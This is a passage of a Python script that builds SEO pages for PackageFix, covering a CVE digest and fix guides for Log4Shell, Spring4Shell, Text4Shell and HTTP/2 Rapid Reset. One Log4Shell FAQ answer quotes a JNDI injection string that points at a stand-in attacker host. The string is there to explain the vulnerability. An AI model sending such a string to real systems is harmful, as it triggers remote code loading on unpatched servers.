#!/usr/bin/env python3
"""
PackageFix — Phase 5 SEO
1. Blog index (/blog)
2. Weekly CVE digest (/blog/weekly-cve-march-2026)
3. Log4Shell dedicated page (/kev/CVE-2021-44228)
4. Spring4Shell dedicated page (/kev/CVE-2022-22965)
5. Text4Shell dedicated page (/kev/CVE-2022-42889)
6. HTTP/2 Rapid Reset (/kev/CVE-2023-44487)
7. Snakeyaml (/kev/CVE-2022-1471)
"""

import os, json

BASE_URL = "https://packagefix.dev"

TOKENS = """
:root {
  --bg:#0B0D14; --surface:#12151F; --surface2:#1A1D2E;
  --border:#252836; --purple:#6C63FF; --green:#22C55E;
  --orange:#F97316; --red:#EF4444; --yellow:#EAB308;
  --text:#E2E4F0; --muted:#6B7280;
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.6;min-height:100vh}
a{color:var(--purple);text-decoration:none}
a:hover{text-decoration:underline}
.site-header{border-bottom:1px solid var(--border);padding:14px 24px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:700;color:var(--text)}
.logo span{color:var(--purple)}
.nav-links{display:flex;gap:20px;font-size:12px}
.nav-links a{color:var(--muted)}
.nav-links a:hover{color:var(--text);text-decoration:none}
.container{max-width:860px;margin:0 auto;padding:48px 24px}
.breadcrumb{font-size:11px;color:var(--muted);margin-bottom:24px;display:flex;gap:6px;flex-wrap:wrap}
.breadcrumb a{color:var(--muted)}
h1{font-size:clamp(18px,3vw,28px);font-weight:700;margin-bottom:12px;line-height:1.3}
h2{font-size:15px;font-weight:600;margin:36px 0 12px}
h3{font-size:13px;font-weight:600;margin:24px 0 8px}
p{color:var(--muted);margin-bottom:12px;font-size:12px;line-height:1.7}
.lead{color:var(--text);font-size:13px;margin-bottom:24px;line-height:1.7}
.kev-banner{background:rgba(239,68,68,.12);border:1px solid var(--red);border-radius:10px;padding:16px 20px;margin:24px 0}
.kev-banner .label{font-size:10px;font-weight:700;color:var(--red);text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px}
.kev-banner p{color:var(--red);margin:0;font-size:12px}
.info-box{background:rgba(108,99,255,.08);border:1px solid rgba(108,99,255,.3);border-left:3px solid var(--purple);border-radius:8px;padding:16px 20px;margin:20px 0}
.fix-box{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.3);border-left:3px solid var(--green);border-radius:8px;padding:16px 20px;margin:20px 0}
.fix-box .label{font-size:10px;font-weight:700;color:var(--green);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px}
pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:14px 16px;overflow-x:auto;font-size:11px;line-height:1.6;margin:8px 0;white-space:pre-wrap}
code{background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:1px 5px;font-size:11px}
.cta-box{background:var(--surface);border:1px solid var(--purple);border-radius:10px;padding:24px;margin:32px 0;text-align:center}
.cta-box p{color:var(--text);font-size:13px;margin-bottom:16px}
.cta-btn{display:inline-block;background:var(--purple);color:#fff;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;padding:12px 28px;border-radius:7px;text-decoration:none}
.cta-btn:hover{opacity:.9;text-decoration:none}
.badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;text-transform:uppercase;letter-spacing:.05em}
.badge-red{background:rgba(239,68,68,.2);color:var(--red);border:1px solid var(--red)}
.badge-orange{background:rgba(249,115,22,.2);color:var(--orange);border:1px solid var(--orange)}
.badge-green{background:rgba(34,197,94,.2);color:var(--green);border:1px solid var(--green)}
.badge-purple{background:rgba(108,99,255,.2);color:var(--purple);border:1px solid var(--purple)}
.cve-table{width:100%;border-collapse:collapse;margin:16px 0;font-size:12px}
.cve-table th{text-align:left;padding:10px 12px;border-bottom:1px solid var(--border);color:var(--muted);font-weight:600;font-size:10px;text-transform:uppercase;letter-spacing:.08em}
.cve-table td{padding:10px 12px;border-bottom:1px solid var(--border);vertical-align:top}
.cve-table tr:last-child td{border-bottom:none}
.faq{margin:40px 0}
.faq-item{border-bottom:1px solid var(--border);padding:16px 0}
.faq-item:last-child{border-bottom:none}
.faq-q{font-size:12px;font-weight:600;color:var(--text);margin-bottom:8px}
.faq-a{font-size:12px;color:var(--muted);line-height:1.7}
.related-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-top:12px}
.related-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
.related-card a{color:var(--text);font-size:12px;font-weight:500}
.related-card p{font-size:11px;color:var(--muted);margin:4px 0 0}
.blog-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;margin-top:16px}
.blog-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:20px}
.blog-card .tag{font-size:10px;color:var(--purple);text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px}
.blog-card h3{font-size:13px;font-weight:600;margin:0 0 8px}
.blog-card h3 a{color:var(--text)}
.blog-card p{font-size:11px;margin:0 0 12px}
.blog-card .meta{font-size:10px;color:var(--muted)}
.digest-item{border-bottom:1px solid var(--border);padding:20px 0}
.digest-item:last-child{border-bottom:none}
.digest-item h3{font-size:13px;font-weight:600;margin:0 0 6px}
.digest-item .severity{margin-bottom:8px}
.site-footer{border-top:1px solid var(--border);padding:24px;text-align:center;font-size:11px;color:var(--muted);margin-top:60px}
.site-footer a{color:var(--muted)}
@media(max-width:640px){.nav-links{display:none}.related-grid{grid-template-columns:1fr}.blog-grid{grid-template-columns:1fr}}
"""

def shell(title, desc, canonical_path, breadcrumbs, body, schemas):
    canonical = BASE_URL + canonical_path
    schema_json = json.dumps({"@context":"https://schema.org","@graph":schemas}, indent=2)
    crumb_html = " <span style='color:var(--border)'>/</span> ".join(
        f'<a href="{u}">{n}</a>' if u else f'<span style="color:var(--text)">{n}</span>'
        for n,u in breadcrumbs
    )
    og_type = "article" if "/blog/" in canonical_path else "website"
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{title}</title>
<meta name="description" content="{desc}">
<link rel="canonical" href="{canonical}">
<meta property="og:title" content="{title}">
<meta property="og:description" content="{desc}">
<meta property="og:url" content="{canonical}">
<meta property="og:type" content="{og_type}">
<meta name="twitter:card" content="summary">
<link rel="icon" type="image/svg+xml" href="/icon.svg">
<link rel="icon" type="image/png" sizes="512x512" href="/icon.png">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<script type="application/ld+json">{schema_json}</script>
<style>{TOKENS}</style>
</head>
<body>
<header class="site-header">
  <a href="https://packagefix.dev" class="logo">Package<span>Fix</span></a>
  <nav class="nav-links">
    <a href="https://packagefix.dev">Tool</a>
    <a href="https://packagefix.dev/blog">Blog</a>
    <a href="https://packagefix.dev/cisa-kev">CISA KEV</a>
    <a href="https://packagefix.dev/alternatives">Alternatives</a>
    <a href="https://github.com/metriclogic26/packagefix">GitHub</a>
  </nav>
</header>
<main class="container">
  <div class="breadcrumb">{crumb_html}</div>
  {body}
</main>
<footer class="site-footer">
  <p>PackageFix · <a href="https://packagefix.dev">packagefix.dev</a> · MIT Licensed · Open Source</p>
  <p style="margin-top:6px">Part of the MetricLogic network ·
  <a href="https://configclarity.dev">ConfigClarity</a> ·
  <a href="https://domainpreflight.dev">DomainPreflight</a></p>
  <p style="margin-top:6px">Vulnerability data: <a href="https://osv.dev">OSV Database</a> · <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">CISA KEV Catalog</a></p>
  <p style="margin-top:6px">Always test dependency updates in staging before deploying to production.</p>
</footer>
</body>
</html>"""

def cta():
    return """<div class="cta-box">
  <p>Paste your manifest — get back a fixed version with all CVEs patched in seconds.</p>
  <a href="https://packagefix.dev" class="cta-btn">Open PackageFix →</a>
  <p style="margin-top:12px;font-size:11px;color:var(--muted)">No signup · No CLI · No GitHub · Runs 100% in your browser</p>
</div>"""

def faq_html(faqs):
    items = "".join(f'<div class="faq-item"><div class="faq-q">{q}</div><div class="faq-a">{a}</div></div>' for q,a in faqs)
    return f'<div class="faq"><h2>Frequently Asked Questions</h2>{items}</div>'

def related_html(pages):
    cards = "".join(f'<div class="related-card"><a href="{p["url"]}">{p["title"]}</a><p>{p["desc"]}</p></div>' for p in pages)
    return f'<div style="margin:40px 0"><h2>Related Guides</h2><div class="related-grid">{cards}</div></div>'

all_paths = []

def write(slug, html):
    path = os.path.join("seo", slug, "index.html")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    all_paths.append("/" + slug)
    print(f"  ✓ /{slug}")

# ══════════════════════════════════════════════════════════════════════════════
# PAGE 1 — BLOG INDEX
# ══════════════════════════════════════════════════════════════════════════════

blog_index_body = """
<h1>PackageFix Blog — Dependency Security Guides</h1>
<p class="lead">Supply chain security, CVE analysis, and dependency management guides for developers.</p>

<div class="blog-grid">
  <div class="blog-card">
    <div class="tag">Supply Chain Security</div>
    <h3><a href="/blog/supply-chain-attacks-package-json">5 Supply Chain Attacks Hiding in Your package.json</a></h3>
    <p>npm audit misses Glassworm Unicode injection, zombie packages, typosquatting, build script injection, and CISA KEV entries. Here's what to look for.</p>
    <div class="meta">March 22, 2026 · 8 min read</div>
  </div>

  <div class="blog-card">
    <div class="tag">Weekly CVE Digest</div>
    <h3><a href="/blog/weekly-cve-march-2026">Weekly CVE Digest — March 2026</a></h3>
    <p>This week's most critical CVEs across npm, PyPI, Ruby, PHP, Go, Rust, and Java. Log4Shell still being exploited. New HTTP/2 rapid reset variants.</p>
    <div class="meta">March 22, 2026 · 5 min read</div>
  </div>
</div>

<div style="margin:48px 0">
  <h2>CVE Reference Pages</h2>
  <p>Dedicated pages for the highest-impact CVEs — with fix guides for every affected ecosystem.</p>
  <div class="related-grid">
    <div class="related-card"><a href="/kev/CVE-2021-44228">CVE-2021-44228 — Log4Shell</a><p>Apache Log4j CRITICAL RCE</p></div>
    <div class="related-card"><a href="/kev/CVE-2022-22965">CVE-2022-22965 — Spring4Shell</a><p>Spring Framework CRITICAL RCE</p></div>
    <div class="related-card"><a href="/kev/CVE-2022-42889">CVE-2022-42889 — Text4Shell</a><p>Commons Text CRITICAL RCE</p></div>
    <div class="related-card"><a href="/kev/CVE-2023-44487">CVE-2023-44487 — HTTP/2 Reset</a><p>Multi-ecosystem HIGH DoS</p></div>
    <div class="related-card"><a href="/kev/CVE-2022-1471">CVE-2022-1471 — SnakeYAML</a><p>Java CRITICAL RCE</p></div>
    <div class="related-card"><a href="/cisa-kev">All CISA KEV Packages</a><p>Full actively exploited list</p></div>
  </div>
</div>
"""

blog_schemas = [
    {"@type":"Blog","name":"PackageFix Blog",
     "description":"Dependency security guides and CVE analysis",
     "url":BASE_URL+"/blog",
     "publisher":{"@type":"Organization","name":"PackageFix","url":BASE_URL}},
    {"@type":"BreadcrumbList","itemListElement":[
        {"@type":"ListItem","position":1,"name":"PackageFix","item":BASE_URL},
        {"@type":"ListItem","position":2,"name":"Blog","item":BASE_URL+"/blog"}
    ]}
]

write("blog", shell(
    "PackageFix Blog — Dependency Security Guides",
    "Supply chain security, CVE analysis, and dependency management guides. Weekly CVE digest covering npm, PyPI, Ruby, PHP, Go, Rust, and Java.",
    "/blog",
    [("PackageFix","/"),("Blog",None)],
    blog_index_body, blog_schemas
))

# ══════════════════════════════════════════════════════════════════════════════
# PAGE 2 — WEEKLY CVE DIGEST MARCH 2026
# ══════════════════════════════════════════════════════════════════════════════

DIGEST_ITEMS = [
    ("CVE-2024-29041","express","npm","MEDIUM","4.17.1","4.19.2",
     "Open redirect via response.redirect() with unsanitized input. If you accept user-controlled redirect targets, upgrade immediately.",
     "/fix/npm/express"),
    ("CVE-2023-44487","grpc-go / golang.org/x/net / Netty / hyper","Go + Java + Rust","HIGH","multiple","see fix guides",
     "HTTP/2 rapid reset attack enabling denial of service. Affects any server implementing HTTP/2. Multiple ecosystems affected simultaneously — check all your Go, Java, and Rust dependencies.",
     "/fix/go/grpc"),
    ("CVE-2024-27351","Django","PyPI","HIGH","< 4.2.13 / < 5.0.3","4.2.13 / 5.0.3",
     "ReDoS in strip_tags() HTML sanitizer. If you use django.utils.html.strip_tags() on untrusted input, this can cause server hang under load.",
     "/fix/pypi/django"),
    ("CVE-2022-1471","SnakeYAML","Java/Maven","CRITICAL","< 2.0","2.0+",
     "Remote code execution via unsafe YAML deserialization. Any application using new Yaml().load() with untrusted input is fully compromised. Appears on CISA KEV — actively exploited.",
     "/fix/java/snakeyaml"),
    ("CVE-2024-21508","mysql2","npm","CRITICAL","< 3.9.7","3.9.7",
     "Remote code execution via SQL injection in prepared statement handling. If you use mysql2 with user-controlled input in preparedStatement, upgrade immediately.",
     "/fix/npm/mysql2"),
    ("CVE-2024-35176","rexml","Ruby","HIGH","< 3.2.6","3.2.6",
     "Denial of service via XML entity expansion. Affects any Ruby application parsing untrusted XML with rexml. Bundled with Ruby stdlib.",
     "/fix/ruby/rexml"),
    ("CVE-2024-1135","gunicorn","PyPI","HIGH","< 22.0.0","22.0.0",
     "HTTP request smuggling via invalid Transfer-Encoding header. Any gunicorn deployment behind a reverse proxy is potentially affected.",
     "/fix/pypi/gunicorn"),
]

digest_items_html = ""
for cve, pkg, eco, sev, vuln_ver, safe_ver, desc, fix_url in DIGEST_ITEMS:
    sev_class = "badge-red" if sev == "CRITICAL" else "badge-orange" if sev == "HIGH" else "badge-purple"
    digest_items_html += f"""<div class="digest-item">
  <h3><a href="https://osv.dev/vulnerability/{cve}" target="_blank" rel="noopener">{cve}</a> — {pkg}</h3>
  <div class="severity">
    <span class="badge badge-purple" style="font-size:9px">{eco}</span>
    <span class="badge {sev_class}" style="margin-left:6px">{sev}</span>
    {'<span class="badge badge-red" style="margin-left:6px">CISA KEV</span>' if cve in ["CVE-2022-1471"] else ""}
  </div>
  <p><strong>Affected:</strong> {vuln_ver} · <strong>Fix:</strong> {safe_ver}</p>
  <p>{desc}</p>
  <p><a href="{fix_url}">Full fix guide →</a></p>
</div>"""

digest_faqs = [
    ("How do I scan for all CVEs listed in this digest?","Paste your manifest file into PackageFix. It queries the live OSV database and will flag any of these CVEs if your installed versions are affected."),
    ("How often is the weekly CVE digest published?","Every week. PackageFix monitors the OSV database and CISA KEV catalog for new entries across all 7 supported ecosystems."),
    ("Which CVE in this digest is most urgent?","CVE-2022-1471 (SnakeYAML) — it is on the CISA KEV catalog (actively exploited) and allows remote code execution. CVE-2024-21508 (mysql2) is also CRITICAL and should be patched immediately."),
]

digest_body = f"""
<h1>Weekly CVE Digest — March 22, 2026</h1>
<p style="color:var(--muted);font-size:11px;margin-bottom:24px">March 22, 2026 · PackageFix · 7 CVEs this week across npm, PyPI, Ruby, Go, Rust, Java</p>
<p class="lead">The most critical dependency CVEs published or newly exploited this week across all 7 ecosystems PackageFix supports. Paste your manifest into PackageFix to check if you're affected.</p>

<div class="kev-banner">
  <div class="label">🔴 CISA KEV Update This Week</div>
  <p>CVE-2022-1471 (SnakeYAML) confirmed actively exploited. Any Java application using SnakeYAML &lt; 2.0 should be treated as critical priority.</p>
</div>

<h2>This Week's CVEs</h2>
{digest_items_html}

{cta()}
{faq_html(digest_faqs)}
{related_html([
    {"url":"/blog/supply-chain-attacks-package-json","title":"Supply Chain Attacks in package.json","desc":"5 attacks npm audit misses"},
    {"url":"/cisa-kev","title":"CISA KEV Package List","desc":"All actively exploited packages"},
    {"url":"/fix/java/snakeyaml","title":"Fix SnakeYAML CVE-2022-1471","desc":"CRITICAL RCE fix guide"},
    {"url":"/fix/npm/mysql2","title":"Fix mysql2 CVE-2024-21508","desc":"CRITICAL RCE fix guide"},
])}
"""

digest_schemas = [
    {"@type":"Article",
     "headline":"Weekly CVE Digest — March 22, 2026",
     "description":"Most critical dependency CVEs this week across npm, PyPI, Ruby, Go, Rust, and Java.",
     "datePublished":"2026-03-22","dateModified":"2026-03-22",
     "author":{"@type":"Organization","name":"PackageFix","url":BASE_URL},
     "publisher":{"@type":"Organization","name":"PackageFix","url":BASE_URL}},
    {"@type":"BreadcrumbList","itemListElement":[
        {"@type":"ListItem","position":1,"name":"PackageFix","item":BASE_URL},
        {"@type":"ListItem","position":2,"name":"Blog","item":BASE_URL+"/blog"},
        {"@type":"ListItem","position":3,"name":"Weekly CVE Digest March 2026","item":BASE_URL+"/blog/weekly-cve-march-2026"}
    ]},
    {"@type":"FAQPage","mainEntity":[
        {"@type":"Question","name":q,"acceptedAnswer":{"@type":"Answer","text":a}}
        for q,a in digest_faqs
    ]}
]

write("blog/weekly-cve-march-2026", shell(
    "Weekly CVE Digest March 2026 — npm, PyPI, Ruby, Java | PackageFix",
    "7 critical CVEs this week: SnakeYAML RCE (CISA KEV), mysql2 RCE, Django ReDoS, HTTP/2 rapid reset, gunicorn smuggling. Fix guides for all ecosystems.",
    "/blog/weekly-cve-march-2026",
    [("PackageFix","/"),("Blog","/blog"),("Weekly CVE Digest March 2026",None)],
    digest_body, digest_schemas
))

# ══════════════════════════════════════════════════════════════════════════════
# KEV PAGE TEMPLATE
# ══════════════════════════════════════════════════════════════════════════════

def kev_page(cve_id, name, nickname, cvss, published, desc_long,
             affected_pkgs, fix_guides, timeline, faqs):
    path = f"/kev/{cve_id}"
    sev_class = "badge-red" if cvss >= 9.0 else "badge-orange"
    sev_label = "CRITICAL" if cvss >= 9.0 else "HIGH"

    affected_rows = "".join(
        f'<tr><td>{eco}</td><td>{pkg}</td><td>{vuln}</td><td>{safe}</td><td><a href="{fix}">Fix guide →</a></td></tr>'
        for eco, pkg, vuln, safe, fix in affected_pkgs
    )

    timeline_html = "".join(
        f'<div style="display:flex;gap:16px;padding:8px 0;border-bottom:1px solid var(--border)"><span style="color:var(--muted);font-size:11px;min-width:100px">{date}</span><span style="font-size:12px;color:var(--text)">{event}</span></div>'
        for date, event in timeline
    )

    body = f"""
<h1>{cve_id} — {name} <span class="badge {sev_class}">{sev_label}</span></h1>
{'<div style="display:inline-block;margin-bottom:4px"><span class="badge badge-red">🔴 CISA KEV — Actively Exploited</span></div>' if True else ""}
<p style="color:var(--muted);font-size:11px;margin-bottom:24px">CVSS Score: {cvss} · {'CRITICAL' if cvss >= 9.0 else 'HIGH'} Severity</p>
<p class="lead">{desc_long}</p>

<div class="kev-banner">
  <div class="label">🔴 Confirmed Active Exploitation</div>
  <p>{cve_id} is on the CISA Known Exploited Vulnerabilities catalog. This vulnerability is being used in real attacks against production systems right now. Fix immediately — do not wait for your next release cycle.</p>
</div>

<h2>Affected Packages</h2>
<table class="cve-table">
  <thead><tr><th>Ecosystem</th><th>Package</th><th>Vulnerable</th><th>Safe version</th><th>Fix</th></tr></thead>
  <tbody>{affected_rows}</tbody>
</table>

<h2>Vulnerability Timeline</h2>
<div style="margin:16px 0">{timeline_html}</div>

{cta()}

{faq_html(faqs)}

{related_html([
    {"url":"/cisa-kev","title":"All CISA KEV Packages","desc":"Full actively exploited list"},
    {"url":fix_guides[0][1],"title":f"Fix {affected_pkgs[0][1]}","desc":f"{affected_pkgs[0][0]} fix guide"},
    {"url":"/blog/supply-chain-attacks-package-json","title":"Supply Chain Attack Guide","desc":"5 attacks npm audit misses"},
    {"url":"/blog/weekly-cve-march-2026","title":"Weekly CVE Digest","desc":"This week's critical CVEs"},
])}
"""
    schemas = [
        {"@type":"TechArticle",
         "headline":f"{cve_id} — {name} Fix Guide",
         "description":desc_long[:200],
         "datePublished":"2026-03-22","dateModified":"2026-03-22",
         "author":{"@type":"Organization","name":"PackageFix","url":BASE_URL}},
        {"@type":"BreadcrumbList","itemListElement":[
            {"@type":"ListItem","position":1,"name":"PackageFix","item":BASE_URL},
            {"@type":"ListItem","position":2,"name":"CISA KEV","item":BASE_URL+"/cisa-kev"},
            {"@type":"ListItem","position":3,"name":cve_id,"item":BASE_URL+path}
        ]},
        {"@type":"FAQPage","mainEntity":[
            {"@type":"Question","name":q,"acceptedAnswer":{"@type":"Answer","text":a}}
            for q,a in faqs
        ]}
    ]
    return shell(
        f"{cve_id} ({name}) — Fix Guide for All Ecosystems | PackageFix",
        f"Fix {cve_id} ({name}) — CVSS {cvss}. {desc_long[:120]}. Fix guides for all affected ecosystems.",
        path,
        [("PackageFix","/"),("CISA KEV","/cisa-kev"),(cve_id,None)],
        body, schemas
    )

# ══════════════════════════════════════════════════════════════════════════════
# KEV PAGE DATA
# ══════════════════════════════════════════════════════════════════════════════

print("\n🔴 Generating CISA KEV dedicated pages...")

# CVE-2021-44228 — Log4Shell
write("kev/CVE-2021-44228", kev_page(
    "CVE-2021-44228","Log4Shell — Apache Log4j","Log4Shell",10.0,"December 2021",
    "Log4Shell is the most severe Java vulnerability ever discovered. A remote attacker can execute arbitrary code on any system running Log4j 2.x by sending a crafted string that causes Log4j to make a JNDI lookup. No authentication required. Affects virtually every Java application logging with Log4j 2.x — web servers, enterprise applications, cloud services, embedded systems.",
    [
        ("Java/Maven","log4j-core","< 2.15.0 (critical), < 2.17.1 (all bypasses)","2.23.1","/fix/java/log4j"),
        ("Java/Maven","log4j-api","< 2.15.0","2.23.1","/fix/java/log4j"),
    ],
    [("Java","/fix/java/log4j")],
    [
        ("Dec 9, 2021","CVE published. Zero-day already being exploited in the wild."),
        ("Dec 10, 2021","CISA issues emergency directive for US federal agencies."),
        ("Dec 13, 2021","Log4j 2.15.0 released — first patch (incomplete for some configs)."),
        ("Dec 14, 2021","CVE-2021-45046 found — 2.15.0 bypass. Log4j 2.16.0 released."),
        ("Dec 18, 2021","CVE-2021-45105 found — DoS in 2.16.0. Log4j 2.17.0 released."),
        ("Dec 28, 2021","CVE-2021-44832 found — RCE via JDBC appender. Log4j 2.17.1 released."),
        ("2022–2026","Still being actively exploited in unpatched systems. CISA KEV confirmed ongoing."),
    ],
    [
        ("What is Log4Shell?","Log4Shell (CVE-2021-44228) is a remote code execution vulnerability in Apache Log4j 2.x. An attacker sends a string like ${jndi:ldap://attacker.com/a} in any logged field — HTTP headers, usernames, search queries. Log4j resolves the JNDI reference and loads attacker-controlled code. No authentication required."),
        ("Am I affected by Log4Shell?","Any Java application using Log4j 2.x (2.0-beta9 to 2.14.1) is fully vulnerable. Log4j 2.15.0 is partially patched — upgrade to 2.17.1+ to address all bypasses. Check your pom.xml for log4j-core as a direct or transitive dependency."),
        ("What is the fix for Log4Shell?","Upgrade log4j-core to 2.17.1 or later. If upgrading is not immediately possible, set the JVM argument -Dlog4j2.formatMsgNoLookups=true as a temporary mitigation. Do not rely on this mitigation alone — upgrade as soon as possible."),
        ("Is Log4Shell still being exploited in 2026?","Yes. CISA KEV confirms ongoing exploitation. Unpatched Log4j installations continue to be targeted by ransomware operators, cryptominers, and nation-state actors. Any system still running vulnerable Log4j is actively being scanned for by automated tools."),
        ("How do I check if my Maven project uses Log4j?","Paste your pom.xml into PackageFix. It resolves variable references and checks transitive dependencies — Log4j often comes in as a transitive dependency of other frameworks like Apache Struts, Elasticsearch, or Spring Boot.")
    ]
))

# CVE-2022-22965 — Spring4Shell
write("kev/CVE-2022-22965", kev_page(
    "CVE-2022-22965","Spring4Shell — Spring Framework","Spring4Shell",9.8,"March 2022",
    "Spring4Shell is a critical remote code execution vulnerability in Spring Framework MVC and WebFlux applications running on Java 9 or later. An attacker can exploit data binding to write a malicious JSP file to the server and execute arbitrary code. Affected the majority of Spring Boot applications deployed on Apache Tomcat with Java 9+.",
    [
        ("Java/Maven","spring-webmvc","< 5.3.18 / < 5.2.20","6.1.6 (or 5.3.18 minimum)","/fix/java/spring-core"),
        ("Java/Maven","spring-webflux","< 5.3.18 / < 5.2.20","6.1.6","/fix/java/spring-core"),
        ("Java/Maven","spring-boot","< 2.6.6 / < 2.5.12","3.2.4","/fix/java/spring-core"),
    ],
    [("Java","/fix/java/spring-core")],
    [
        ("Mar 29, 2022","Zero-day PoC published on GitHub — exploit in the wild before patch."),
        ("Mar 31, 2022","Spring Framework 5.3.18 and 5.2.20 released with fix."),
        ("Apr 1, 2022","Spring Boot 2.6.6 and 2.5.12 released."),
        ("Apr 4, 2022","CISA adds to KEV catalog. Mass scanning detected globally."),
        ("2022–2026","Ongoing exploitation of unpatched Spring deployments."),
    ],
    [
        ("What is Spring4Shell?","Spring4Shell (CVE-2022-22965) is a remote code execution vulnerability in Spring Framework's data binding layer. An attacker sends specially crafted HTTP parameters that cause Spring to write a web shell to the server. Requires Java 9+ and Apache Tomcat deployment."),
        ("Am I affected by Spring4Shell?","You are affected if you use Spring MVC or WebFlux with Spring Framework before 5.3.18/5.2.20, deployed on Apache Tomcat, running on Java 9+. Embedded Tomcat (Spring Boot) is also affected."),
        ("What is the fix for Spring4Shell?","Upgrade Spring Framework to 5.3.18+ or 6.1.6+. If using Spring Boot, upgrade to 2.6.6+, 2.5.12+, or 3.x. Paste your pom.xml into PackageFix for transitive version resolution."),
        ("Is Spring4Shell still being exploited?","Yes — CISA KEV confirms ongoing exploitation. Unpatched Spring deployments are actively targeted by automated scanners and ransomware campaigns."),
        ("How do I find my Spring version in a Maven project?","Paste your pom.xml into PackageFix. It resolves spring.version property references and transitive Spring dependencies to confirm your exact version.")
    ]
))

# CVE-2022-42889 — Text4Shell
write("kev/CVE-2022-42889", kev_page(
    "CVE-2022-42889","Text4Shell — Apache Commons Text","Text4Shell",9.8,"October 2022",
    "Text4Shell is a critical remote code execution vulnerability in Apache Commons Text's StringSubstitutor. Variable interpolation in strings can be abused to execute arbitrary code via script:, url:, or dns: lookup prefixes — similar in mechanism to Log4Shell. Affects any application using StringSubstitutor or StringLookupFactory with untrusted input.",
    [
        ("Java/Maven","commons-text","< 1.10.0","1.12.0","/fix/java/commons-text"),
    ],
    [("Java","/fix/java/commons-text")],
    [
        ("Oct 13, 2022","CVE published. Immediately compared to Log4Shell in severity."),
        ("Oct 17, 2022","Apache Commons Text 1.10.0 released with fix."),
        ("Oct 18, 2022","CISA adds to KEV catalog."),
        ("Nov 2022","Security researchers confirm active exploitation attempts."),
        ("2023–2026","Ongoing exploitation in unpatched systems."),
    ],
    [
        ("What is Text4Shell?","Text4Shell (CVE-2022-42889) is an RCE vulnerability in Apache Commons Text. The StringSubstitutor class supports variable interpolation including script:, url:, and dns: prefixes. If untrusted input reaches a StringSubstitutor call, attackers can execute arbitrary code or trigger DNS lookups for exfiltration."),
        ("How is Text4Shell different from Log4Shell?","Both use variable interpolation as the attack vector. Log4Shell affects logging via JNDI. Text4Shell affects string manipulation via StringSubstitutor. Text4Shell requires the application to directly pass untrusted input to StringSubstitutor — the attack surface is smaller but still significant."),
        ("What is the fix for Text4Shell?","Upgrade commons-text to 1.10.0 or later (1.12.0 recommended). The fix disables the dangerous interpolation prefixes by default. Paste your pom.xml into PackageFix to check your current version."),
        ("Am I affected if I don't call StringSubstitutor directly?","You may still be affected if a library you depend on uses Commons Text internally. Paste your pom.xml into PackageFix to check transitive dependencies."),
        ("Is Text4Shell on CISA KEV?","Yes — CISA added CVE-2022-42889 to the Known Exploited Vulnerabilities catalog confirming active exploitation.")
    ]
))

# CVE-2023-44487 — HTTP/2 Rapid Reset
write("kev/CVE-2023-44487", kev_page(
    "CVE-2023-44487","HTTP/2 Rapid Reset Attack","Rapid Reset",7.5,"October 2023",
    "CVE-2023-44487 is a high-severity denial of service vulnerability affecting all HTTP/2 server implementations. An attacker sends a stream of HTTP/2 HEADERS frames immediately followed by RST_STREAM frames, causing servers to consume resources processing requests that are immediately cancelled. This attack achieved record-breaking DDoS volumes — 398 million requests per second against Google infrastructure.",
    [
        ("Go","golang.org/x/net","< 0.17.0","0.23.0","/fix/go/net"),
        ("Go","google.golang.org/grpc","< 1.56.3 / < 1.57.1 / < 1.58.3","1.58.3","/fix/go/grpc"),
        ("Rust","hyper","< 0.14.28 / 1.x < 1.0.1","1.3.1","/fix/rust/hyper"),
        ("Java/Maven","io.netty:netty-codec-http2","< 4.1.100.Final","4.1.108.Final","/fix/java/netty"),
        ("Go","github.com/labstack/echo/v4","< 4.11.2","4.11.4","/fix/go/echo"),
        ("Go","github.com/gofiber/fiber/v2","< 2.50.0","2.52.2","/fix/go/fiber"),
    ],
    [("Go","/fix/go/grpc"),("Rust","/fix/rust/hyper"),("Java","/fix/java/netty")],
    [
        ("Aug 2023","Attack technique discovered being used in the wild by Google, Cloudflare, AWS."),
        ("Oct 10, 2023","Coordinated disclosure. CVE published. Patches released simultaneously."),
        ("Oct 10, 2023","CISA adds to KEV catalog. Record DDoS volumes confirmed (398M rps)."),
        ("Oct–Nov 2023","Mass patching across all HTTP/2 implementations."),
        ("2024–2026","Ongoing exploitation against unpatched servers."),
    ],
    [
        ("What is the HTTP/2 Rapid Reset attack?","CVE-2023-44487 exploits HTTP/2 stream cancellation. An attacker opens many streams with HEADERS frames and immediately cancels them with RST_STREAM. The server allocates resources to process each request before the cancel arrives, leading to resource exhaustion with minimal bandwidth from the attacker."),
        ("Which packages are affected by CVE-2023-44487?","Any HTTP/2 server implementation. In Go: golang.org/x/net, grpc-go, echo, fiber. In Rust: hyper, tokio. In Java: Netty. In Python: h2, httpcore. Update all HTTP framework dependencies to patched versions."),
        ("How do I fix CVE-2023-44487?","Upgrade all HTTP/2-capable framework dependencies. For Go: golang.org/x/net v0.17.0+, grpc-go v1.58.3+. For Rust: hyper 1.3.1+. For Java: Netty 4.1.100.Final+. Paste your manifest into PackageFix to check all affected packages at once."),
        ("Does this affect npm/Node.js?","Node.js released patches (v18.18.2, v20.8.1, v21.0.0) addressing HTTP/2 rapid reset. If you run a Node.js HTTP/2 server, update Node.js itself in addition to your npm dependencies."),
